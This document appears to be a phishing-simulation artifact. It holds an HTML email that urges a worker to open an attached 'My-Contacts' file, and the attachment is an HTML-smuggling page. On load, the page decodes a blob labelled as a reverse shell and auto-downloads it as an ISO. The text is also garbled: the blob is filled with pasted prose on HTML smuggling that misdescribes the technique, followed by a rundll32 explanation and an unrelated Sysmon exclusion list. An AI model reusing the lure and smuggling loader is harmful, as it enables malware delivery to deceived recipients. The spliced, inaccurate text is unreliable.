<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 3"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 3"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 3"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 3"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 3"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 3"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 3"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 4"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 4"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 4"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 4"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 4"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 4"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 4"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 5"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 5"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 5"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 5"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 5"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 5"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 5"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 6"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 6"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 6"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 6"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 6"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 6"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 6"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 1"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 1"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 1"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 1"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 1"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 1"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 1"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 2"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 2"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 2"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 2"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 2"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 2"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 2"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 3"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 3"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 3"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 3"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 3"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 3"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 3"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 4"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 4"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 4"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 4"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 4"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 4"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 4"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 5"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 5"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 5"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 5"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 5"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 5"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 5"/>
<w:LsdException Locked="false" Priority="46" Name="List Table 1 Light Accent 6"/>
<w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 6"/>
<w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 6"/>
<w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 6"/>
<w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 6"/>
<w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful Accent 6"/>
<w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful Accent 6"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Mention"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Smart Hyperlink"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Hashtag"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Unresolved Mention"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Smart Link"/>
</w:LatentStyles>
</xml><![endif]--><style><!--
/* Font Definitions */
@font-face
   {font-family:"Cambria Math";
   panose-1:2 4 5 3 5 4 6 3 2 4;
   mso-font-charset:0;
   mso-generic-font-family:roman;
   mso-font-pitch:variable;
   mso-font-signature:3 0 0 0 1 0;}
@font-face
   {font-family:Calibri;
   panose-1:2 15 5 2 2 2 4 3 2 4;
   mso-font-charset:0;
   mso-generic-font-family:swiss;
   mso-font-pitch:variable;
   mso-font-signature:-469750017 -1040178053 9 0 511 0;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
   {mso-style-unhide:no;
   mso-style-qformat:yes;
   mso-style-parent:"";
   margin:0in;
   mso-pagination:widow-orphan;
   font-size:11.0pt;
   font-family:"Calibri",sans-serif;
   mso-ascii-font-family:Calibri;
   mso-ascii-theme-font:minor-latin;
   mso-fareast-font-family:Calibri;
   mso-fareast-theme-font:minor-latin;
   mso-hansi-font-family:Calibri;
   mso-hansi-theme-font:minor-latin;
   mso-bidi-font-family:"Times New Roman";
   mso-bidi-theme-font:minor-bidi;}
a:link, span.MsoHyperlink
   {mso-style-noshow:yes;
   mso-style-priority:99;
   color:#0563C1;
   mso-themecolor:hyperlink;
   text-decoration:underline;
   text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
   {mso-style-noshow:yes;
   mso-style-priority:99;
   color:#954F72;
   mso-themecolor:followedhyperlink;
   text-decoration:underline;
   text-underline:single;}
p.msonormal0, li.msonormal0, div.msonormal0
   {mso-style-name:msonormal;
   mso-style-unhide:no;
   mso-margin-top-alt:auto;
   margin-right:0in;
   mso-margin-bottom-alt:auto;
   margin-left:0in;
   mso-pagination:widow-orphan;
   font-size:11.0pt;
   font-family:"Calibri",sans-serif;
   mso-fareast-font-family:Calibri;
   mso-fareast-theme-font:minor-latin;}
span.EmailStyle18
   {mso-style-type:personal-compose;
   mso-style-noshow:yes;
   mso-style-unhide:no;
   mso-ansi-font-size:11.0pt;
   mso-bidi-font-size:11.0pt;
   font-family:"Calibri",sans-serif;
   mso-ascii-font-family:Calibri;
   mso-ascii-theme-font:minor-latin;
   mso-fareast-font-family:Calibri;
   mso-fareast-theme-font:minor-latin;
   mso-hansi-font-family:Calibri;
   mso-hansi-theme-font:minor-latin;
   mso-bidi-font-family:"Times New Roman";
   mso-bidi-theme-font:minor-bidi;
   color:windowtext;}
span.SpellE
   {mso-style-name:"";
   mso-spl-e:yes;}
.MsoChpDefault
   {mso-style-type:export-only;
   mso-default-props:yes;
   font-size:10.0pt;
   mso-ansi-font-size:10.0pt;
   mso-bidi-font-size:10.0pt;
   font-family:"Calibri",sans-serif;
   mso-ascii-font-family:Calibri;
   mso-ascii-theme-font:minor-latin;
   mso-fareast-font-family:Calibri;
   mso-fareast-theme-font:minor-latin;
   mso-hansi-font-family:Calibri;
   mso-hansi-theme-font:minor-latin;
   mso-bidi-font-family:"Times New Roman";
   mso-bidi-theme-font:minor-bidi;}
@page WordSection1
   {size:8.5in 11.0in;
   margin:1.0in 1.0in 1.0in 1.0in;
   mso-header-margin:.5in;
   mso-footer-margin:.5in;
   mso-paper-source:0;}
div.WordSection1
   {page:WordSection1;}
--></style><!--[if gte mso 10]><style>/* Style Definitions */
table.MsoNormalTable
   {mso-style-name:"Table Normal";
   mso-tstyle-rowband-size:0;
   mso-tstyle-colband-size:0;
   mso-style-noshow:yes;
   mso-style-priority:99;
   mso-style-parent:"";
   mso-padding-alt:0in 5.4pt 0in 5.4pt;
   mso-para-margin:0in;
   mso-pagination:widow-orphan;
   font-size:10.0pt;
   font-family:"Calibri",sans-serif;
   mso-ascii-font-family:Calibri;
   mso-ascii-theme-font:minor-latin;
   mso-hansi-font-family:Calibri;
   mso-hansi-theme-font:minor-latin;
   mso-bidi-font-family:"Times New Roman";
   mso-bidi-theme-font:minor-bidi;}
</style><![endif]--><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72" style='tab-interval:.5in;word-wrap:break-word'><div class=WordSection1><p class=MsoNormal>Hey <span class=SpellE>Maveris</span>&nbsp;Worker,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Please see my attached contacts list. You will have to open My-Contacts file and click to import my contacts.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Thanks!<o:p></o:p></p></div></body></html>

--Mark=_-683968373-341984186456--

--Mark=_-683968373-341984186248
Content-Type: application/octet-stream;
	name="=?utf-8?B?TXktQ29udGFjdHMuaHRtbA==?="
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="=?utf-8?B?TXktQ29udGFjdHMuaHRtbA==?="

My-Contacts.html

<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

HTML smuggling is a technique used to bypass security measures by embedding malicious code within seemingly harmless HTML code. Here is a simple algorithm for HTML smuggling:

1.  Identify the target website or application that you want to attack.
2.  Create a malicious HTML payload that includes the code you want to execute on the target system.
3.  Encode the payload using a technique that will allow it to pass through security measures undetected. Common techniques include URL encoding, base64 encoding, and escaping special characters.
4.  Identify a vulnerable input field on the target website or application where you can inject your malicious payload. This could be a search field, a contact form, or a comment section.
5.  Inject your encoded payload into the vulnerable input field.
6.  Submit the form or send the request to the target website or application.
7.  When the target system processes the input, it will decode and execute your malicious payload.

It's important to note that HTML smuggling is illegal and unethical. It can cause serious harm to individuals and organizations, and can result in legal consequences for the perpetrator. It's important to use your knowledge and skills for ethical purposes and to protect the security of computer systems and the privacy of individuals.

';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'My-Contacts.iso';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>

The name of the Windows executable leveraged to execute malicious code on the system in the context of the "Signed Binary Proxy Execution" technique is "rundll32.exe".

The "Signed Binary Proxy Execution" technique is a method of bypassing application whitelisting controls by proxying execution of a signed binary. This technique involves the use of a legitimate signed binary, such as "rundll32.exe", to execute a malicious payload. The attacker can use the "rundll32.exe" binary to load a malicious DLL that is disguised as a legitimate binary. By doing this, the attacker can bypass application whitelisting controls that are designed to block unauthorized binaries from executing on the system.

In this technique, the attacker typically modifies the Registry or creates a scheduled task to trigger the execution of the "rundll32.exe" binary with the appropriate parameters to load the malicious DLL. The attacker can also use this technique to bypass other security controls, such as antivirus software, that rely on application whitelisting to block unauthorized binaries from executing on the system.

It's important for organizations to be aware of this technique and to implement appropriate security controls to detect and prevent this type of attack. This may include implementing application whitelisting policies that are more restrictive and that include monitoring and logging of system events. Additionally, organizations should regularly update and patch their systems to prevent known vulnerabilities from being exploited.

<Sysmon schemaversion="4.50">
  <!-- Capture all hashes -->
  <HashAlgorithms>*</HashAlgorithms>
  <EventFiltering>
    <!-- Log all drivers except if the signature -->
    <!-- contains Microsoft or Windows -->
    <DriverLoad onmatch="exclude">
      <Signature condition="contains">microsoft</Signature>
      <Signature condition="contains">windows</Signature>
    </DriverLoad>
    <!-- Do not log process termination -->
    <ProcessCreate onmatch="exclude">
	<!--SECTION: Microsoft Windows-->
			<CommandLine condition="begin with"> "C:\Windows\system32\wermgr.exe" "-queuereporting_svc" </CommandLine> <!--Windows:Windows error reporting/telemetry-->
			<CommandLine condition="begin with">C:\Windows\system32\DllHost.exe /Processid</CommandLine> <!--Windows-->
			<CommandLine condition="begin with">C:\Windows\system32\wbem\wmiprvse.exe -Embedding</CommandLine> <!--Windows: WMI provider host-->
			<CommandLine condition="begin with">C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</CommandLine> <!--Windows: WMI provider host-->
			<CommandLine condition="is">C:\Windows\system32\wermgr.exe -upload</CommandLine> <!--Windows:Windows error reporting/telemetry-->
			<CommandLine condition="is">C:\Windows\system32\SearchIndexer.exe /Embedding</CommandLine> <!--Windows: Search Indexer-->
			<CommandLine condition="is">C:\windows\system32\wermgr.exe -queuereporting</CommandLine> <!--Windows:Windows error reporting/telemetry-->
			<CommandLine condition="is">\??\C:\Windows\system32\autochk.exe *</CommandLine> <!--Microsoft:Bootup: Auto Check Utility-->
			<CommandLine condition="is">\SystemRoot\System32\smss.exe</CommandLine> <!--Microsoft:Bootup: Windows Session Manager-->
			<CommandLine condition="is">C:\Windows\System32\RuntimeBroker.exe -Embedding</CommandLine> <!--Windows:Apps permissions [ https://fossbytes.com/runtime-broker-process-windows-10/ ] -->
			<Image condition="is">C:\Program Files (x86)\Common Files\microsoft shared\ink\TabTip32.exe</Image> <!--Windows: Touch Keyboard and Handwriting Panel Helper-->
			<Image condition="is">C:\Windows\System32\TokenBrokerCookies.exe</Image> <!--Windows: SSO sign-in assistant for MicrosoftOnline.com-->
			<Image condition="is">C:\Windows\System32\plasrv.exe</Image> <!--Windows: Performance Logs and Alerts DCOM Server-->
			<Image condition="is">C:\Windows\System32\wifitask.exe</Image> <!--Windows: Wireless Background Task-->
			<Image condition="is">C:\Windows\system32\CompatTelRunner.exe</Image> <!--Windows: Customer Experience Improvement-->
			<Image condition="is">C:\Windows\system32\PrintIsolationHost.exe</Image> <!--Windows: Printing-->
			<Image condition="is">C:\Windows\system32\SppExtComObj.Exe</Image> <!--Windows: KMS activation-->
			<Image condition="is">C:\Windows\system32\audiodg.exe</Image> <!--Windows: Launched constantly-->
			<Image condition="is">C:\Windows\system32\conhost.exe</Image> <!--Windows: Command line interface host process-->
			<Image condition="is">C:\Windows\system32\mobsync.exe</Image> <!--Windows: Network file syncing-->
			<Image condition="is">C:\Windows\system32\musNotification.exe</Image> <!--Windows: Update pop-ups-->
			<Image condition="is">C:\Windows\system32\musNotificationUx.exe</Image> <!--Windows: Update pop-ups-->
			<Image condition="is">C:\Windows\system32\powercfg.exe</Image> <!--Microsoft:Power configuration management-->
			<Image condition="is">C:\Windows\system32\sndVol.exe</Image> <!--Windows: Volume control-->
			<Image condition="is">C:\Windows\system32\sppsvc.exe</Image> <!--Windows: Software Protection Service-->
			<Image condition="is">C:\Windows\system32\wbem\WmiApSrv.exe</Image> <!--Windows: WMI performance adapter host process-->
			<IntegrityLevel condition="is">AppContainer</IntegrityLevel> <!--Windows: Don't care about sandboxed processes right now. Will need to revisit this decision.-->
			<ParentCommandLine condition="begin with">%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows</ParentCommandLine> <!--Windows:CommandShell: Triggered when programs use the command shell, but doesn't provide attribution for what caused it-->
			<ParentCommandLine condition="is">C:\windows\system32\wermgr.exe -queuereporting</ParentCommandLine> <!--Windows:Windows error reporting/telemetry-->
			<CommandLine condition="is">C:\WINDOWS\system32\devicecensus.exe UserCxt</CommandLine>
			<CommandLine condition="is">C:\Windows\System32\usocoreworker.exe -Embedding</CommandLine>
			<ParentImage condition="is">C:\Windows\system32\SearchIndexer.exe</ParentImage> <!--Windows:Search: Launches many uninteresting sub-processes-->
			<!--SECTION: Windows:svchost-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k appmodel -s StateRepository</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k appmodel -p -s camsvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k appmodel</CommandLine> <!--Windows 10-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k appmodel -p -s tiledatamodelsvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k camera -s FrameServer</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k dcomlaunch -s LSM</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k dcomlaunch -s PlugPlay</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k defragsvc</CommandLine> <!--Windows defragmentation-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k devicesflow -s DevicesFlowUserSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k imgsvc</CommandLine> <!--Microsoft:The Windows Image Acquisition Service-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localService -s EventSystem</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localService -s bthserv</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k LocalService -p -s BthAvctpSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localService -s nsi</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localService -s w32Time</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceAndNoImpersonation</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceAndNoImpersonation -p</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted -s Dhcp</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted -s EventLog</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted -s TimeBrokerSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted -s WFDSConMgrSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -s BTAGService</CommandLine>
			<CommandLine condition="is">C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService</CommandLine> <!--Win10:1903:Network Connection Broker-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceAndNoImpersonation -s SensrSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceAndNoImpersonation -p -s SSDPSRV</CommandLine> <!--Windows:SSDP [ https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol ] -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNoNetwork</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -p -s WPDBusEnum</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -p -s fhsvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s DeviceAssociationService</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s NcbService</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s SensorService</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s TabletInputService</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s UmRdpService</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s WPDBusEnum</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -p -s NgcSvc</CommandLine> <!--Microsoft:Passport-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceNetworkRestricted -p -s NgcCtnrSvc</CommandLine> <!--Microsoft:Passport Container-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localServiceAndNoImpersonation -s SCardSvr</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv</CommandLine>
			<CommandLine condition="is">C:\Windows\System32\svchost.exe -k netsvcs -p -s SessionEnv</CommandLine> <!--Windows:Remote desktop configuration-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted -s WdiSystemHost</CommandLine> <!--Windows: Diagnostic System Host [ http://www.blackviper.com/windows-services/diagnostic-system-host/ ] -->
			<CommandLine condition="is">C:\Windows\System32\svchost.exe -k localSystemNetworkRestricted -p -s WdiSystemHost</CommandLine> <!--Windows: Diagnostic System Host [ http://www.blackviper.com/windows-services/diagnostic-system-host/ ] -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted</CommandLine> <!--Windows-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc</CommandLine> <!--Windows: Windows Live Sign-In Assistant [ https://www.howtogeek.com/howto/30348/what-are-wlidsvc.exe-and-wlidsvcm.exe-and-why-are-they-running/ ] -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -p -s ncaSvc</CommandLine> <!--Windows: Network Connectivity Assistant [ http://www.blackviper.com/windows-services/network-connectivity-assistant/ ] -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s BDESVC</CommandLine> <!--Windows:Network: BitLocker Drive Encryption-->
			<CommandLine condition="is">C:\Windows\System32\svchost.exe -k netsvcs -p -s BDESVC</CommandLine> <!--Microsoft:Win10:1903:Network: BitLocker Drive Encryption-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -p -s BITS</CommandLine> <!--Windows:Network: Background Intelligent File Transfer (BITS) -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s BITS</CommandLine> <!--Windows:Network: Background Intelligent File Transfer (BITS) -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s CertPropSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s DsmSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s Gpsvc</CommandLine> <!--Windows:Network: Group Policy -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s ProfSvc</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s SENS</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s SessionEnv</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s Themes</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs -s Winmgmt</CommandLine> <!--Windows: Windows Management Instrumentation (WMI) -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -p -s DoSvc</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -s Dnscache</CommandLine> <!--Windows:Network: DNS caching, other uses -->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -s LanmanWorkstation</CommandLine> <!--Windows:Network: "Workstation" service, used for SMB file-sharing connections and RDP-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -s NlaSvc</CommandLine> <!--Windows:Network: Network Location Awareness-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -s TermService</CommandLine> <!--Windows:Network: Terminal Services (RDP)-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkService -p</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k networkServiceNetworkRestricted</CommandLine> <!--Windows: Network services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k rPCSS</CommandLine> <!--Windows Services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k secsvcs</CommandLine>
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k swprv</CommandLine> <!--Microsoft:Software Shadow Copy Provider-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k unistackSvcGroup</CommandLine> <!--Windows 10-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k utcsvc</CommandLine> <!--Windows Services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k wbioSvcGroup</CommandLine> <!--Windows Services-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k werSvcGroup</CommandLine> <!--Windows: ErrorReporting-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc</CommandLine> <!--Windows: Update Medic Service [ https://www.thewindowsclub.com/windows-update-medic-service ] -->
			<CommandLine condition="is">C:\Windows\System32\svchost.exe -k wsappx -p -s ClipSVC</CommandLine> <!--Windows:Apps: Client License Service-->
